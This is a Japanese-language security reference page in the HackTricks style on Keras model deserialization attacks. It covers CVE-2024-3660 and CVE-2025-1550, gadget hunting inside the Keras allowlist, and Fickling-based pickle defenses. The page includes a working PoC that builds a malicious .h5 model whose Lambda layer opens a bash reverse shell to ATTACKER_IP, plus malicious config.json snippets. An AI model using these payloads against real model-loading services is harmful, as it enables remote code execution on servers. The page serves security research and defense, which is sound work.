# Keras Model Deserialization RCE and Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

このページでは、Keras model deserialization pipeline に対する実践的な exploitation techniques をまとめ、native .keras format の内部構造と attack surface を説明し、Model File Vulnerabilities (MFVs) および post-fix gadgets を見つけるための researcher toolkit を提供します。

## .keras model format の内部構造

A .keras file は、少なくとも以下を含む ZIP archive です:<sup>[[1]](#references)</sup>
- metadata.json – 一般的な情報（例: Keras version）
- config.json – model architecture（primary attack surface）
- model.weights.h5 – HDF5 内の weights

config.json は recursive deserialization を制御します。Keras は modules を import し、classes/functions を解決し、attacker-controlled dictionaries から layers/objects を再構築します。<sup>[[1]](#references)</sup>

Dense layer object の example snippet:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
Deserialization は以下を実行します:<sup>[[1]](#references)</sup>
- module/class_name keys からの Module import と symbol resolution
- attacker-controlled な kwargs を使用した from_config(...) または constructor invocation
- nested objects（activations、initializers、constraints など）への再帰

Historically、config.json を作成する attacker には以下の 3 つの primitives が公開されていました:<sup>[[1]](#references)</sup>
- import する modules の制御
- 解決される classes/functions の制御
- constructors/from_config に渡される kwargs の制御

## CVE-2024-3660 – Lambda-layer bytecode RCE

Root cause:
- Lambda.from_config() は python_utils.func_load(...) を使用して attacker の bytes を base64-decode し、marshal.loads() を呼び出していました。Python の unmarshalling は code を実行できます。<sup>[[1]](#references)[[3]](#references)</sup>

Exploit idea（config.json 内の simplified payload）:
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"function_type": "lambda",
"bytecode_b64": "<attacker_base64_marshal_payload>"
}
}
}
```
Mitigation:
- Keras はデフォルトで safe_mode=True を強制します。Lambda 内の Serialized Python functions は、ユーザーが safe_mode=False を明示的に指定して opt out しない限りブロックされます。<sup>[[1]](#references)</sup>

Notes:
- Legacy formats（古い HDF5 saves）や古い codebase では modern checks が強制されない場合があるため、被害者が古い loader を使用すると、「downgrade」形式の攻撃が依然として適用される可能性があります。

## CVE-2025-1550 – Keras ≤ 3.8 における Arbitrary module import

Root cause:
- _retrieve_class_or_fn は、config.json に含まれる attacker-controlled な module strings を使用し、制限のない importlib.import_module() を実行していました。
- Impact: インストール済みの任意の module（または攻撃者が sys.path 上に配置した module）を import できます。import-time code が実行された後、attacker kwargs を使用して object construction が行われます。<sup>[[1]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

Exploit idea:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Security improvements (Keras ≥ 3.9):<sup>[[1]](#references)[[2]](#references)</sup>
- Module allowlist: imports は公式 ecosystem modules に限定: keras, keras_hub, keras_cv, keras_nlp
- Safe mode default: safe_mode=True は unsafe な Lambda serialized-function loading をブロック
- Basic type checking: deserialized objects は expected types と一致する必要がある

## Practical exploitation: TensorFlow-Keras HDF5 (.h5) Lambda RCE

多くの production stacks は、今でも legacy の TensorFlow-Keras HDF5 model files (.h5) を受け入れている。攻撃者が、サーバーによって後から load または inference の実行が行われる model を upload できる場合、Lambda layer によって load/build/predict 時に arbitrary Python を実行できる。<sup>[[7]](#references)</sup>

deserialized または使用された際に reverse shell を実行する malicious .h5 を作成する最小限の PoC:
```python
import tensorflow as tf

def exploit(x):
import os
os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```
注意事項と信頼性のヒント:
- Trigger points: code は複数回実行される可能性があります（例: layer の build/first call 中、model.load_model、predict/fit）。payload は idempotent にしてください。<sup>[[7]](#references)</sup>
- Version pinning: serialization mismatches を避けるため、対象の TF/Keras/Python に合わせてください。たとえば、target が使用しているのが Python 3.8 と TensorFlow 2.13.1 であれば、その環境で artifacts を構築します。<sup>[[7]](#references)</sup>
- Quick environment replication:
```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```
- 検証: `os.system("ping -c 1 YOUR_IP")` のような無害な payload を使うと、reverse shell に切り替える前に実行を確認できます（例: `tcpdump` で ICMP を観測）。<sup>[[7]](#references)</sup>

## allowlist 内の修正後の gadget surface

allowlisting と safe mode を使用しても、許可された Keras callable の範囲には依然として広い surface が残ります。たとえば、keras.utils.get_file は任意の URL からユーザーが選択した場所へ download できます。<sup>[[1]](#references)</sup>

許可された関数を参照する Lambda を介した Gadget（serialized Python bytecode ではない）:
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {
"fname": "artifact.bin",
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
重要な制限事項:
- Lambda.call() は、target callable の呼び出し時に入力 tensor を最初の positional argument として付加します。選択する gadget は、追加の positional arg を許容する必要があります（または *args/**kwargs を受け入れる必要があります）。このため、利用可能な関数が制限されます。<sup>[[1]](#references)</sup>

## AI/ML models 向け ML pickle import allowlisting (Fickling)

多くの AI/ML model formats（PyTorch .pt/.pth/.ckpt、joblib/scikit-learn、older TensorFlow artifacts など）には、Python pickle data が埋め込まれています。Attackers は、load 中に RCE や model swapping を実現するため、pickle GLOBAL imports と object constructors を日常的に悪用しています。Blacklist-based scanners は、未知の、またはリストにない dangerous imports を見逃すことがよくあります。<sup>[[8]](#references)[[14]](#references)</sup>

実用的な fail-closed defense は、Python の pickle deserializer に hook し、unpickling 中に review 済みの harmless な ML-related imports セットのみを許可することです。Trail of Bits の Fickling はこの policy を実装し、数千件の public Hugging Face pickles から作成された curated ML import allowlist を提供しています。<sup>[[8]](#references)[[13]](#references)</sup>

“safe” imports の security model（research と practice から得られた直感を整理したもの）: pickle が使用する imported symbols は、同時に以下を満たす必要があります。<sup>[[8]](#references)</sup>
- code を実行したり、execution を引き起こしたりしない（compiled/source code objects、shelling out、hooks などを含まない）
- 任意の attributes や items を get/set しない
- pickle VM から他の Python objects への references を import または取得しない
- secondary deserializers（marshal、nested pickle など）を、間接的な場合も含めて trigger しない

Fickling の protections は process startup の可能な限り早い段階で有効化し、frameworks（torch.load、joblib.load など）が実行する pickle loads がチェックされるようにします。<sup>[[9]](#references)</sup>
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
運用上のヒント:
- 必要に応じて、hooksを一時的に無効化/再有効化できます:<sup>[[9]](#references)</sup>
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- 既知の安全な model がブロックされた場合は、symbols を確認した後、環境の allowlist を拡張します:<sup>[[9]](#references)</sup>
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- Fickling は、より細かな制御を行いたい場合に、汎用的な runtime guards も提供します：<sup>[[9]](#references)</sup>
- fickling.always_check_safety() ですべての pickle.load() に対する checks を強制
- with fickling.check_safety(): でスコープ限定の強制
- fickling.load(path) / fickling.is_likely_safe(path) で単発の checks

- 可能な場合は、pickle 以外の model formats（例：SafeTensors）を優先してください。<sup>[[15]](#references)</sup> pickle を受け入れる必要がある場合は、network egress なしの最小権限で loaders を実行し、allowlist を強制してください。

この allowlist-first strategy は、互換性を高く維持しながら、一般的な ML pickle exploit paths を実証的にブロックします。ToB の benchmark では、Fickling は synthetic malicious files の 100% を検出し、主要な Hugging Face repos の clean files の約 99% を許可しました。<sup>[[8]](#references)[[10]](#references)</sup>


## 研究者向け toolkit

1) 許可された modules における体系的な gadget discovery

keras、keras_nlp、keras_cv、keras_hub 全体で candidate callables を列挙し、file/network/process/env side effects を持つものを優先します。<sup>[[1]](#references)</sup>

<details>
<summary>allowlisted Keras modules 内の潜在的に危険な callables を列挙</summary>
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
</details>

2) Direct deserialization testing（.keras archive は不要）

細工した dicts を Keras deserializers に直接渡し、受け入れられる params を把握して side effects を観察します。<sup>[[1]](#references)</sup>
```python
from keras import layers

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {"fname": "x", "origin": "https://example.com/x"}
}
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```
3) version横断のプロービングと形式

Kerasは、異なるguardrailと形式を持つ複数のcodebase/世代に存在します:<sup>[[1]](#references)</sup>
- TensorFlow built-in Keras: tensorflow/python/keras（legacy、削除予定）
- tf-keras: 個別に保守
- Multi-backend Keras 3（official）: native .kerasを導入

codebaseと形式（.kerasとlegacy HDF5）をまたいでテストを繰り返し、regressionや不足しているguardを発見します。

## References

- [1] [Keras Model Deserializationの脆弱性を探す（huntr blog）](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [2] [Keras PR #20751 - serializationにチェックを追加](https://github.com/keras-team/keras/pull/20751)
- [3] [CVE-2024-3660 - Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [4] [CVE-2025-1550 - Keras arbitrary module import（<= 3.8）](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [5] [huntr report - arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [6] [huntr report - arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [7] [HTB Artificial - TensorFlow .h5 Lambda RCE to root](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [8] [Trail of Bits blog - Ficklingの新しいAI/ML pickle file scanner](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [9] [Fickling - AI/ML環境のSecuring（README）](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [10] [Fickling pickle scanning benchmark corpus](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [11] [Picklescan](https://github.com/mmaitre314/picklescan)
- [12] [ModelScan](https://github.com/protectai/modelscan)
- [13] [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [14] [Sleepy Pickle attacksの背景](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [15] [SafeTensors project](https://github.com/safetensors/safetensors)

{{#include ../../banners/hacktricks-training.md}}
